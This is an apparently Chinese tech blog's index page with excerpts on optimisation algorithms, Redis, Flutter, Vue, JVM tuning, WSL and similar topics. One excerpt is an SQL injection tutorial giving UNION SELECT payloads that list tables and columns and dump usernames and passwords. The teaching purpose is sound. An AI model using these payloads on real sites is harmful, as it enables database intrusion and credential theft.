		<h2 class="list__title post__title">
			<a href="/posts/6a2123dfbda71ff057ae581d5d908291/" rel="bookmark">
			Python实现粒子群算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、推荐粒子群理论教程
优化算法笔记（三）粒子群算法（1） - 简书
二、Python实现代码
# -*- coding: utf-8 -*- import numpy as np np.random.seed(20) ''' 设x0：价格，x1：促销，x2：竞品价格 x为三维数据 实际情况这里应该是，比如： 利润 = F销量(x0,x1,x2) * x0 - 成本，其中F销量为调用销量预测的结果 两种方案：一是fitfun作为参数传入，二是该条销量预测样本数据作为参数传入 ''' def get_max_lirun(x): # 更新features中的x # 调用销量预测模型获得结果 # 计算适应度值 f_value = (-2 * x[0, 0]) + (4000 * x[0, 1]) + (4000 * x[0, 2]) return f_value class Particle(object): ''' 粒子类 __x: 粒子位置 __v: 粒子速度 __bestX: 粒子历史最优位置 __fitnessValue: 粒子历史最优适应度 ''' def __init__(self, min_x, max_x, max_v, dim, fitness_fun): self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a2123dfbda71ff057ae581d5d908291/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e457439ddb16f25c21f29c7b2745a352/" rel="bookmark">
			SpringBoot实现Redis失效监听事件—KeyExpirationEventMessageListener
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习记录
在可以正常连接Redis存取数据之后，创建监听类KeyExpiredListener，集成KeyExpirationEventMessageListener类，重写onMessage方法。
这说明一下：在key失效之后，会出发onMessage方法。
在这里，我只是获取redis中失效的key值。
注意：只能获取失效的key值，不能获取key对应的value值。代码中的输出语句为null，可以证明。
import org.springframework.beans.factory.annotation.Autowired; import org.springframework.data.redis.connection.Message; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.listener.KeyExpirationEventMessageListener; import org.springframework.data.redis.listener.RedisMessageListenerContainer; import org.springframework.stereotype.Component; import java.nio.charset.StandardCharsets; @Component public class KeyExpiredListener extends KeyExpirationEventMessageListener { @Autowired public RedisTemplate&lt;String,String&gt; redisTemplate; public KeyExpiredListener(RedisMessageListenerContainer listenerContainer) { super(listenerContainer); } @Override public void onMessage(Message message, byte[] bytes) { String key = new String(message.getBody(), StandardCharsets.UTF_8); String myKey = redisTemplate.opsForValue().get("myKey"); System.out.println(myKey); //根据自身业务 书写逻辑 } } 创建一个配置类RedisListenerConfig
import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.listener.RedisMessageListenerContainer; @Configuration public class RedisListenerConfig { @Bean RedisMessageListenerContainer container(RedisConnectionFactory connectionFactory) { RedisMessageListenerContainer container = new RedisMessageListenerContainer(); container.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e457439ddb16f25c21f29c7b2745a352/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f530a845de75fced23ce7a47dbd53392/" rel="bookmark">
			Flutter 软键盘导致界面重绘的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用Flutter 开发的应用，在自己搭建的百度地图页面，点击进入一个界面输入内容，发现弹出键盘会出现在第一个百度页面出现空白的问题，并且在控制行抛出错误，
E/BufferQueueProducer(19941): [SurfaceTexture-0-19941-2](id:4de500000027,api:0,p:-1,c:19941) dequeueBuffer: BufferQueue has no connected producer
查找了资料发现，因为弹出的键盘导致页面进行了重绘，所以百度地图加载了异常，所以解决方案为
在Scafford 中设置 resizeToAvoidBottomPadding: false,
然后就显示正常了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1edee8589cb29d3174962afdbd973659/" rel="bookmark">
			Linux telnet 命令详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 telnet补充说明语法选项参数实例 telnet 登录远程主机和管理(测试ip端口是否连通)
补充说明 telnet命令 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。
语法 telnet(选项)(参数) 选项 -8：允许使用8位字符资料，包括输入与输出； -a：尝试自动登入远端系统； -b&lt;主机别名&gt;：使用别名指定远端主机名称； -c：不读取用户专属目录里的.telnetrc文件； -d：启动排错模式； -e&lt;脱离字符&gt;：设置脱离字符； -E：滤除脱离字符； -f：此参数的效果和指定"-F"参数相同； -F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机； -k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名； -K：不自动登入远端主机； -l&lt;用户名称&gt;：指定要登入远端主机的用户名称； -L：允许输出8位字符资料； -n&lt;记录文件&gt;：指定文件记录相关信息； -r：使用类似rlogin指令的用户界面； -S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息； -x：假设主机有支持数据加密的功能，就使用它； -X&lt;认证形态&gt;：关闭指定的认证形态。 参数 远程主机：指定要登录进行管理的远程主机；端口：指定TELNET协议使用的端口号。 实例 $ telnet 192.168.2.10 Trying 192.168.2.10... Connected to 192.168.2.10 (192.168.2.10). Escape character is '^]'. localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1) login: root Password: Login incorrect 一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。
$ telnet 192.168.188.132 Trying 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1edee8589cb29d3174962afdbd973659/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a80837cfbd9c2e7b0fe3b1b69afeae3/" rel="bookmark">
			Simulink模型生成代码配置（配置教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言： Simulink模型生成代码、Simulink仿真、Simulink实时仿真机（SpeedGoat\dsPACE）等配置方式各不相同，本篇文章主要介绍一下Simulink模型生成代码如何进行配置。
模板下载地址：https://download.csdn.net/download/RNG_uzi_/88189160
正文： 一、求解器二、数据导入/导出三、数学和数据类型四、诊断五、硬件实现六、模型引用七、仿真目标八、代码生成九、覆盖度十、Simscape十一、Simscape Multibody 一、求解器 二、数据导入/导出 三、数学和数据类型 四、诊断 五、硬件实现 六、模型引用 七、仿真目标 八、代码生成 九、覆盖度 十、Simscape 十一、Simscape Multibody 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a70778d39345162b618b9b9cdd15d13/" rel="bookmark">
			微信支付 | 微信小程序版 视频演示&#43;源码分享 快速上手
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 微信支付 V3 Uniapp版 演示视频 视频方视频地址B站演示地址 上手指南 微信支付参数获取 appId: 微信开放平台申请APPID mch_id: 微信商户号 mch_serial_no: 商户证书序列号 api_v3_key: api密钥 private_key: 商户密钥 入库格式: -----BEGIN PRIVATE KEY----- xxxx -----END PRIVATE KEY----- 上述参数 获取 可按此文档 https://pay.weixin.qq.com/wiki/doc/apiv3/open/devpreparation/chapter1_1_1.shtml openId: 用户在直连商户appid下的唯一标识 获取方式-&gt;微信登录 源码分享地址 前后端项目地址前端代码地址后端代码地址 支付流程简要 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4eaef13bc968f0d3aaf0700a248f1fe/" rel="bookmark">
			【vue3&#43;elementuiplus】el-select下拉框会自动触发校验规则的最强解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 场景：新增弹层和编辑弹层共用一个组件，其中有select需要做必填校验，select的必填触发规则是change。
当第一次打开的是新增弹层时，一切安好。
若是先打开编辑弹层，再打开新增弹层，新增弹层就会自动触发select的校验规则。
以上显然不符合需求。
为了取消el-select的自动校验，我尝试了更换select的校验触发方式为blur，但是会带来一个新的问题——先点击确定触发校验，再选择select，校验提示不会消失。
所以，显然更换blur并不符合需求。
检索了其他回答，均无用。
我猜测产生该问题的原因是：在关闭弹层事件中，我做了resetfileds和clearfileds，resetfileds置空form表单，其实本质上也是一种改变select的操作，故而触发了select的change事件，在第二次打开新增弹层时，select的值为''，所以才会触发表单校验规则。
因此，我在el-dialog上面加了销毁属性，当dialog关闭后，整个组件就被销毁，打开新增弹层时已经是一个新dom，就不会出现bug了。
解决方案： :destory-on-close="true"
&lt;el-dialog v-model="dialogVisible" title="Tips" width="30%" :destory-on-close="true" :before-close="handleClose" &gt; &lt;/el-dialog&gt; 2023_0808更新：突然发现，使用:destory-on-close也不能解决select校验被触发的问题了，就寻求了新的解决方法
这回子我没有再使用:before-close，因为我发现，@close只要dialog关闭就会被触发，无论是点击取消关闭，还是点击dialog之外的地方让其关闭，都会自动触发@close，如果使用:before-close，那么每次点击取消，点击提交的之后，还要调一下:before-close事件去触发关闭事件，就显得很冗余，所以我之后都采用的@close，也许也正是因为这个原因，让:destory-on-close="true"失效了
&lt;el-dialog v-model="dialogVisible" title="订阅管理" width="756px" align-center @close="handleClose" &gt; &lt;template #footer&gt; &lt;span class="dialog-footer"&gt; &lt;el-button @click="dialogVisible = false"&gt;取消&lt;/el-button&gt; &lt;el-button type="primary" @click="submit(ruleFormRef)" :loading="loading"&gt; 提交 &lt;/el-button&gt; &lt;/span&gt; &lt;/template&gt; &lt;/el-dialog&gt; 解决：关闭的时候只使用resetFields就可以既清空表单又清空校验状态，如果加上了clearValidate，反而select的校验就无法清空，另外，如果你发现有些表单的值无法清空，有些却可以，请注意*每一个el-form-item都要有prop属性才可
const handleClose = () =&gt; { dialogVisible.value = false; ruleFormRef.value?.resetFields(); // ruleFormRef.value?.clearValidate(); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0032c4ea5b258db063eb0b98da5f10c/" rel="bookmark">
			Threejs 地图3D可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可以直接去github github.com/1023byte/3Dmap
前言 threejs小练习，从头实现如何加载地理数据，并将其映射到三维场景中的对象上。
获取数据 在开始绘制图形前，需要一份包含地理信息数据，我们可以从阿里云提供的小工具获取datav.aliyun.com/portal/school/atlas/area_selector
在范围选择器中，可以选择整个或者各个省份的地理信息数据。
生成图形 获取数据后，先分析一下JSON的结构
image.png properties 中包含了名字、中心、质心等信息， geometry.coordinates 则是地理的坐标点，我们需要做的是将这些点连成线。
THREE.Shpae const createMap = (data) =&gt; { const map = new THREE.Object3D(); data.features.forEach((feature) =&gt; { const unit = new THREE.Object3D(); const { coordinates, type } = feature.geometry; coordinates.forEach((coordinate) =&gt; { if (type === "MultiPolygon") coordinate.forEach((item) =&gt; fn(item)); if (type === "Polygon") fn(coordinate); function fn(coordinate) { const mesh = createMesh(coordinate); unit.add(mesh); } }); map.add(unit); }); return map; }; 这里需要注意在geometry中的type分为MultiPolygon和Polygon，需要分别处理，不然会造成个别区域缺失,二者区别是MultiPolygon的坐标多一层嵌套数据，所以这里多做一次遍历。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0032c4ea5b258db063eb0b98da5f10c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4d80c186625b0892b400391cdb719b8/" rel="bookmark">
			创建型模式-工厂模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、工厂模式1. 简单工厂模式1.1 结构1.2 实现1.3 优缺点1.4 扩展-静态工厂 2. 工厂方法模式2.1 概念2.2 结构2.3 实现2.4 优缺点 3. 抽象工厂模式3.1 概念3.2 结构3.3 实现3.4 优缺点3.5 使用场景 4. 工厂模式扩展4.1 简单工厂+配置文件解除耦合 5. JDK源码解析-Collection.iterator方法 一、工厂模式 概述
需求：设计一个咖啡店点餐系统。
设计一个咖啡类（Coffee），并定义其两个子类（美式咖啡【AmericanCoffee】和拿铁咖啡【LatteCoffee】）；再设计一个咖啡店类（CoffeeStore），咖啡店具有点咖啡的功能。
在java中，万物皆对象，这些对象都需要创建，如果创建的时候直接new该对象，就会对该对象耦合严重，假如我们要更换对象，所有new对象的地方都需要修改一遍，这显然违背了软件设计的开闭原则。如果我们使用工厂来生产对象，我们就只和工厂打交道就可以了，彻底和对象解耦，如果要更换对象，直接在工厂里更换该对象即可，达到了与对象解耦的目的；所以说，工厂模式最大的优点就是：解耦。
在本章中会介绍三种工厂的使用：
简单工厂模式（不属于GOF的23种经典设计模式）工厂方法模式抽象工厂模式 1. 简单工厂模式 简单工厂不是一种设计模式，反而比较像是一种编程习惯。
1.1 结构 简单工厂包含如下角色：
抽象产品 ：定义了产品的规范，描述了产品的主要特性和功能。具体产品 ：实现或者继承抽象产品的子类具体工厂 ：提供了创建产品的方法，调用者通过该方法来获取产品。 1.2 实现 现在使用简单工厂对上面案例进行改进，类图如下：
咖啡类：
public abstract class Coffee { public abstract String getName(); //加糖 public void addsugar() { System.out.println("加糖"); } //加奶 public void addMilk() { System.out.println("加奶"); } } 美式咖啡：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4d80c186625b0892b400391cdb719b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c91cc3148d410dfa219e8513e5ffb18/" rel="bookmark">
			【无标题】发大水
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发大声道@TOC
欢迎使用Markdown编辑器 你好！ 这是你第一次使用 Markdown编辑器 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。
新的改变 我们对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：
全新的界面设计 ，将会带来全新的写作体验；在创作中心设置你喜爱的代码高亮样式，Markdown 将代码片显示选择的高亮样式 进行展示；增加了 图片拖拽 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；全新的 KaTeX数学公式 语法；增加了支持甘特图的mermaid语法1 功能；增加了 多屏幕编辑 Markdown文章功能；增加了 焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置 等功能，功能按钮位于编辑区域与预览区域中间；增加了 检查列表 功能。 功能快捷键 撤销：Ctrl/Command + Z
重做：Ctrl/Command + Y
加粗：Ctrl/Command + B
斜体：Ctrl/Command + I
标题：Ctrl/Command + Shift + H
无序列表：Ctrl/Command + Shift + U
有序列表：Ctrl/Command + Shift + O
检查列表：Ctrl/Command + Shift + C
插入代码：Ctrl/Command + Shift + K
插入链接：Ctrl/Command + Shift + L
插入图片：Ctrl/Command + Shift + G
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c91cc3148d410dfa219e8513e5ffb18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26f1769b1dbdbe1e6f4da56fc2e99091/" rel="bookmark">
			网络安全之Sql注入、sqlmap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL注入 SQL注入基础 SQL注入漏洞从1998年圣诞节大火以来，长盛不衰，虽然开发人员想出各种方法对它进行围追堵截，却始终不能赶尽杀绝，sql注入的根本原因就是将SQL代码插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。
SQL注入是如何产生的 web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把SQL语句带进数据库进行查询。
以下图为例，假如用户传输的参数id没有过滤，union联合查询就可以改变这个sql语句。
SQL注入的危害 绕过登录验证:使用万能密码登录网站后台等。获取敏感数据:获取网站管理员帐号、密码等。文件系统操作:列目录，读取、写入文件等。注册表操作:读取、写入、删除注册表等。 判断注入漏洞的依据是什么 根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。
常见的SQL注入方式 —.根据注入的方式来分类:
1.get注入
2.post注入
3.cookie注入
二.注入方式来分类
1.有回显的注入
2.盲注
3.二次注入
4.报错注入
5.堆叠注入
6.宽字节注入
sql注入攻击流程 —.判断是否存在sql注入与sql注入的类型判断方法:
1.先看类型，第一种有报错注入的，用’先来判断，如果报错就说明有sql注入
2.遇到盲注需要用逻辑语句：and语句。例如and 1=1 and 1=2 ，OR 320=6 AND 000909=000909 – '等。
二、判断sql注入是字符型还是数字型进行闭合
三、利用order by爆出列数
（由此可以看出，users表仅有三列）
四、利用database ()获取数据库名
五、爆表名
union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()%23
六、爆列
union select 1,group_concat(column_name),3 frominformation_schema.columns where table_name=‘users’%23
七、爆值
union select 1,2,group_concat (username, password) from users --+
注：concat、concat_ws、group_concat的区别：
concat用法
功能∶将多个字符串连接成一个字符串。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26f1769b1dbdbe1e6f4da56fc2e99091/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5aef4237e38967281539320750eac53/" rel="bookmark">
			WSL安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WSL安装 1.Microsoft store 安装 1.1 启动WSL功能 在【程序和功能 -&gt; 启用或关闭 Windows 功能】中勾选【适用于 Linux 的 Windows 子系统】
1.2 Store中下载安装 在 Microsoft Store 中下载并安装需要的 Linux 发行版
2.不使用Store安装WSL 注：1.1也要做
2.1 下载镜像 以ubuntu为例，第一种方法是通过命令行下载，管理员打开shell,执行：
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1804 -OutFile ./Ubuntu.appx -UseBasicParsing https://aka.ms/wsl-ubuntu-1804 就是下载的地址，看后缀能看到指定下载的是ubuntu1804版本，想要下载其他版本直接修改这里；
也可以直接去网站下载，一样的，网址： https://learn.microsoft.com/zh-cn/windows/wsl/install-manual
我在网站下载速度极慢无比，于是在shell里下的，但是shell里下载2004和2204版本都会失败，下载几百K后就会自动停止，只有1804版本没有问题，所以我就用了1804版本， 如果有哪位大佬看到这里并了解2004和2204版本失败原因，请留言指教一下~
2.2 解压 下载下来的镜像是appx格式，直接改为zip格式，然后解压就可以，打开会看到一个exe：
之后以管理员身份运行安装即可。
最后出去看一下本地WSL版本确认一下安装是否成功：
2.3 安装遇错 2.3.1 下载失败：请求被中止: 未能创建 SSL/TLS 安全通道 忘截图了，问题就是下载镜像时候终端，提示请求被中止: 未能创建 SSL/TLS 安全通道
解决方案：管理员身份执行：
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 2.3.2 WslRegisterDistribution failed with error: 0x80070005 运行安装时报错：
这个问题可能是windows版本太新了，导致内核对wsl的某些版本不兼容；（其实我怀疑是前面2.3.1那个修改导致的但我没有证据^__^ ）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5aef4237e38967281539320750eac53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67efa0e5bde8e0d2e12f150a32442e48/" rel="bookmark">
			使用 POI 在 Word 中重新开始编号、自定义标题格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图
引入依赖 &lt;!-- https://mvnrepository.com/artifact/org.apache.poi/poi --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;4.1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt; &lt;version&gt;4.1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml-schemas&lt;/artifactId&gt; &lt;version&gt;4.1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;ooxml-schemas&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-scratchpad&lt;/artifactId&gt; &lt;version&gt;4.1.2&lt;/version&gt; &lt;/dependency&gt; 示例代码 import cn.hutool.core.date.DateTime; import org.apache.poi.xwpf.usermodel.*; import org.openxmlformats.schemas.wordprocessingml.x2006.main.*; import org.springframework.stereotype.Component; import javax.annotation.PostConstruct; import javax.xml.bind.annotation.adapters.HexBinaryAdapter; import java.io.File; import java.io.FileOutputStream; import java.io.IOException; import java.math.BigInteger; import java.time.LocalDateTime; @Component public class CreateTestWordUtil { private static CreateTestWordUtil createJGWordUtil; int numLevel = 0; //编号 String filePath; String filename; @PostConstruct public void init() { createJGWordUtil = this; } /** * @param styles 样式 * @param strStyleId 标题id * @param headingLevel 标题级别 * @param pointSize 字体大小（/2） * @param hexColor 字体颜色 * @param typefaceName 字体名称（默认微软雅黑） */ public void createHeadingStyle(XWPFStyles styles, String strStyleId, int headingLevel, int pointSize, String hexColor, String typefaceName) { //创建样式 CTStyle ctStyle = CTStyle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67efa0e5bde8e0d2e12f150a32442e48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e79a3e9c751129b6bc90ac63ae959727/" rel="bookmark">
			几种常见的JVM调优场景（建议收藏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近很多小伙伴跟我说，自己学了不少JVM的调优知识，但是在实际工作中却不知道何时对JVM进行调优。今天，我就为大家介绍几种JVM调优的场景。
在阅读本文时，假定大家已经了解了运行时的数据区域和常用的垃圾回收算法，也了解了Hotspot支持的垃圾回收器。
cpu占用过高 cpu占用过高要分情况讨论，是不是业务上在搞活动，突然有大批的流量进来，而且活动结束后cpu占用率就下降了，如果是这种情况其实可以不用太关心，因为请求越多，需要处理的线程数越多，这是正常的现象。话说回来，如果你的服务器配置本身就差，cpu也只有一个核心，这种情况，稍微多一点流量就真的能够把你的cpu资源耗尽，这时应该考虑先把配置提升吧。
第二种情况，cpu占用率长期过高，这种情况下可能是你的程序有那种循环次数超级多的代码，甚至是出现死循环了。排查步骤如下：
（1）用top命令查看cpu占用情况
这样就可以定位出cpu过高的进程。在linux下，top命令获得的进程号和jps工具获得的vmid是相同的：
（2）用top -Hp命令查看线程的情况
可以看到是线程id为7287这个线程一直在占用cpu
也可以用以下命令找到这个进程中占用 CPU 较高的那些线程：
$ ps p 7268 -L -o pcpu,pid,tid,time,tname,cmd &gt; ~/10495ps.txt
（3）把线程号转换为16进制
[root@localhost ~]# printf "%x" 7287 1c77 记下这个16进制的数字，下面我们要用
（4）用jstack工具查看线程栈情况
[root@localhost ~]# jstack 7268 | grep 1c77 -A 10 "http-nio-8080-exec-2" #16 daemon prio=5 os_prio=0 tid=0x00007fb66ce81000 nid=0x1c77 runnable [0x00007fb639ab9000] java.lang.Thread.State: RUNNABLE at com.spareyaya.jvm.service.EndlessLoopService.service(EndlessLoopService.java:19) at com.spareyaya.jvm.controller.JVMController.endlessLoop(JVMController.java:30) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e79a3e9c751129b6bc90ac63ae959727/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5af33363b24dba35c6d53475de7d50ea/" rel="bookmark">
			vue filter过滤器中this不指向vue实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决方法，声明一个全局变量=this，在过滤器中使用全局变量
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13bd3141b148e06d28356a04bab77a06/" rel="bookmark">
			Node.js安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Node.js安装教程 1. Node.js是什么？ Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I/O模型， [1] 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。 [2]
Node.js对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好，V8引擎执行Javascript的速度非常快，性能非常好，基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。
2. npm是什么？ npm是Node.js的包管理器。它作为一个开源项目创建于 2009 年，旨在帮助JavaScript开发人员轻松共享打包的代码模块。npm由三个独立的部分组成：网站，注册表(registry)，命令行工具(CLI）。
npm 是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具，也是世界上最大的软件注册表，里面包含超过600000 个 包的结构，能够使您轻松跟踪依赖项和版本。
3. 安装Node.js环境 node.js下载官网: https://nodejs.cn/download/
点击Windows安装包，进行下载
选择我同意，点击下一步
选择安装位置，点击下一步
点击下一步
点击下一步 点击安装 安装完成
4. 检测Node.js是否安装成功 打开cmd窗口输入如下指令/
输入：node -v npm -v 如下所示就是安装成功了
5. Node.js环境配置 1. 创建全局目录和缓存目录文件夹 此处的环境配置主要配置的是 npm 安装的全局模块所在的路径，以及缓存cache的路径，之所以要配置，是因为以后在执行类似：npm install express [-g] （后面的可选参数-g，g代表global全局安装的意思）的安装语句时。
在Node.js的安装路径下面创建 node_global、node_cache两个文件夹
node_global：npm全局安装位置
node_cache：npm缓存路径
2. 设置全局目录和缓存目录，创建完两个空文件夹之后，打开cmd命令窗口，输入 npm config set prefix “node_global所在的目录路径” npm config set prefix “F:\Software\OOP\LeadingEnd\Node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13bd3141b148e06d28356a04bab77a06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/452b2532705c9b030e6dbc7eafcfb1ab/" rel="bookmark">
			jsp中根据参数类型动态拼接标签的class类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;%-- 判断是否是数字--%&gt; &lt;c:set var="codeString" value="${gantryTarget.gantry.code}"/&gt;
&lt;% String className = new String("dpTD_NUM");
String codeString = (String)pageContext.getAttribute("codeString");
try{
Double.valueOf(codeString);
}catch(Exception e){
className = new String("dpTD");
}
%&gt;
&lt;TD align='center' class="&lt;%=className%&gt;" &gt;${codeString}&lt;/TD&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b3e7f82a21b6805e05708e0b0bbdd1c/" rel="bookmark">
			基于Mediapipe的姿势识别并同步到Unity人体模型中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如题，由于是商业项目，无法公开源码，这里主要说一下实现此功能的思路。
人体关节点识别
基于Mediapipe Unity插件进行开发，性能比较低的CPU主机，无法流畅地运行Mediapipe，这个要注意一下。
Mediapipe33个人体关节点图如下：
Mediapipe关节点映射到Unity人体骨骼
这是开发此功能的一个难点，涉及到了关节点位置与骨骼位置的映射，还有骨骼反向运动。
1、使用unity IK插件比如：Animation Rigging、Final IK等
2、参考ThreeDPoseUnityBarracuda自行去映射关节点。
我这边使用的是第二种方法。主参照ThreeDPoseUnityBarracuda项目中的VNectModel.cs脚本，其中abdomenUpper这个关节点的位置要我们根据Mediapipe传过来的位置进行手动计算再赋值，其他位置可以直接从Mediapipe传过来的值中得到。
另外Build的时候记得将资源加载的方式改为StreamingAssets
最终效果如下：
MediaPipe Pose Tracking
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7eed56e07e9d0612c515c41c1e89e7ad/" rel="bookmark">
			clump的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
clump的基本使用
geometry的四种生成方式
常用的geometry的fish
生成clump模板
批量生成clump
clump的基本使用 A clump is a rigid collection of rigid spherical pebbles. （clump以pebble为基本单元）
geometry的四种生成方式 geometry:
